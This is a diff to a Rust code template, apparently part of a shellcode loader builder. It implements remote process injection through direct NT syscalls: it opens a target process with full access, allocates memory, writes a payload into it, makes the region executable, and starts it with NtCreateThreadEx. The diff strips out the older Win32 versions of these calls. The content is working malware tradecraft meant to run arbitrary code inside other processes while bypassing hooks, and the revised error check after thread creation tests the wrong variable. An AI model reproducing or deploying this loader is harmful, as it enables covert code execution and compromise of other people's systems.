@@ -13,15 +13,12 @@ use winapi::{
         ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
     }
 };
-use ntapi::ntpsapi::PPS_ATTRIBUTE_LIST;
 use winapi::ctypes::c_void;
 use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
-use winapi::shared::ntdef::PVOID;
-use winapi::shared::ntdef::POBJECT_ATTRIBUTES;
 use std::{ptr::null_mut};
 use ntapi::ntapi_base::CLIENT_ID;
 use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
-
+use winapi::shared::ntdef::NULL;
 
 {{IMPORTS}}
 
@@ -48,13 +45,10 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-
-        //let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
         let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
         if !NT_SUCCESS(open_status) {
             panic!("Error opening process: {}", open_status);
         }
-        //let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let mut allocstart : *mut c_void = null_mut();
         let mut size : usize = buf.len();
         let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -68,35 +62,20 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         if !NT_SUCCESS(write_status) {
             panic!("Error writing to the target process: {}", write_status);
         }
-        /*let _resb = WriteProcessMemory(
-            h_process,
-            result_ptr,
-            buf.as_ptr() as _,
-            buf.len(),
-            Some(&mut byteswritten),
-        );
-        */
+
         let mut old_perms = PAGE_READWRITE;
         let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
         if !NT_SUCCESS(protect_status) {
             panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
         }
-        /* 
-        let _bool = VirtualProtectEx(
-            h_process,
-            result_ptr,
-            buf.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut old_perms,
-        );
-        */
+
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, null_mut() as POBJECT_ATTRIBUTES, handle, allocstart, null_mut() as PVOID, 0, 0, 0, 0, null_mut() as PPS_ATTRIBUTE_LIST);
-        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
 
-        if !NT_SUCCESS(write_thread) {
-            panic!("Error failed to create remote thread: {}", write_thread);
+        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, NULL, handle, allocstart, NULL, 0, NULL, NULL, NULL, NULL);
+
+        if write_status != 0 {
+            panic!("Error failed to create remote thread: {:#02X}", write_thread);
         }
     }
 }
